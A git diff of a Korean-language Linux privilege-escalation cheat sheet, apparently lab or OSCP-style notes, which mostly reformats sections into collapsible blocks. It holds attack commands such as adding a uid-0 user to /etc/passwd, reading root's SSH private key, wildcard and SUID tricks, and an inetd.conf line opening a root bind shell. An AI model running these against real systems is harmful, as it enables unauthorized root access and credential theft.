@@ -101,7 +101,9 @@ sup3rS5cr3tF1AgThatN0OneCanSee
 </details>
 
 ---
-## Add New Root User
+<details>
+  <summary><strong>Add New Root User</strong></summary>
+
 ```bash
 # 패스워드 해시 생성
 openssl passwd mrcake
@@ -114,10 +116,12 @@ echo "root2:hKLD3431415ZE:0:0:root:/root:/bin/bash" >> /etc/passwd
 su root2
 Password: mrcake 
 ```
+  
+</details>
 
 ---
-
-## 시스템 정보 수집
+<details>
+  <summary><strong>시스템 정보 수집</strong></summary>
 
 ### OS 정보 확인
 ```bash
@@ -199,16 +203,22 @@ find / -perm -6000 -type f 2>/dev/null
 
 - `env_reset` : `sudo`실행시 환경변수 초기화
 - `SETENV:` : 환경변수 전달 가능.
+  
+</details>
 
 ---
+<details>
+  <summary><strong>Linux Exploit Suggester</strong></summary>
 
-## Linux Exploit Suggester
 - https://github.com/The-Z-Labs/linux-exploit-suggester
 - 예전 버전 리눅스 취약점 발견에 용이
+  
+</details>
 
 ---
+<details>
+  <summary><strong>Disk Group Privilege Escalation</strong></summary>
 
-## Disk Group Privilege Escalation
 - https://www.hackingarticles.in/disk-group-privilege-escalation/
 - `disk` 그룹은 로우 블록 디바이스(예: `/dev/sda`, `/dev/nvme0n1p2`)에 접근할 수 있음
 
@@ -228,60 +238,84 @@ mkdir test
 # SSH 개인키 읽기
 cat /root/.ssh/id_rsa
 ```
+  
+</details>
 
 ---
+<details>
+  <summary><strong>rpc.py Exploit</strong></summary>
 
-## rpc.py Exploit
 - https://github.com/abersheeran/rpc.py
 - https://www.exploit-db.com/exploits/50983
 
----
+  
+</details>
 
-## Makefile Privilege Escalation
+---
+<details>
+  <summary><strong>Makefile Privilege Escalation</strong></summary>
+
 <img width="706" height="636" alt="image" src="https://github.com/user-attachments/assets/553e10b6-f5d7-4494-b3da-94c3167651d4" />
 
 - https://medium.com/@adamforsythebartlett/makefile-privilege-escalation-oscp-62ea2c666d23
+  
+</details>
 
 ---
+<details>
+  <summary><strong>System CTL</strong></summary>
 
-## System CTL
 ```bash
 # nginx 서비스 유닛 내용 보기
 systemctl cat nginx.service
 ```
+  
+</details>
 
 ---
+<details>
+  <summary><strong>7z Wildcard Exploit</strong></summary>
 
-## 7z Wildcard Exploit
 ```bash
 touch @root.txt
 ln -s /file/you/want/to/read root.txt
 ```
 - https://chinnidiwakar.gitbook.io/githubimport/linux-unix/privilege-escalation/wildcards-spare-tricks
+  
+</details>
 
 ---
+<details>
+  <summary><strong>Tar Wildcard Exploit</strong></summary>
 
-## Tar Wildcard Exploit
 <img width="675" height="350" alt="image" src="https://github.com/user-attachments/assets/af27b485-c6fb-4ab7-9b35-b2e20a5f01fa" />
 
 - https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa
-
+  
+</details>
 
 ---
+<details>
+  <summary><strong>Set SUID</strong></summary>
 
-## Set SUID
 ```bash
 chmod +s /bin/bash
 ```
+  
+</details>
 
 ---
+<details>
+  <summary><strong>SSH</strong></summary>
 
-## SSH
 - authorized_keys를 변경할 수 있으면 변경
+  
+</details>
 
 ---
+<details>
+  <summary><strong>공유 라이브러리 취약점</strong></summary>
 
-## 공유 라이브러리 취약점
 ```bash
 # 실행 파일이 사용하는 공유 라이브러리 확인
 ldd /usr/bin/log-sweeper
@@ -291,34 +325,29 @@ ldd /usr/bin/log-sweeper
 # 공유 라이브러리 만들기
 gcc -shared -fPIC ex.c -o ex.so
 ```
+  
+</details>
 
 ---
+<details>
+  <summary><strong>Linux Path Variables 설정</strong></summary>
 
-## Linux White Space
-```bash
-${IFS}
-```
-
----
-
-## Linux Path Variables 설정
 ```bash
 export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
 ```
+  
+</details>
 
 ---
+<details>
+  <summary><strong>inetd.conf (옛날 리눅스 환경)</strong></summary>
 
-## 리버스 셸 연결이 안될 때
-- nc/bash/python3 등 리버스 연결이 되지 않는다면 elf 파일 혹은 exe 파일을 만들어서 전달해서 실행시켜보기
-- 리스닝 포트를 well known 포트(80,443 등)로 바꿔서 받아보기
-
----
-
-## inetd.conf (옛날 리눅스 환경)
 ```bash
 echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf
 ```
 - 31337번 포트로 바인드 셸 연결
+  
+</details>
 
 ---
 <details>
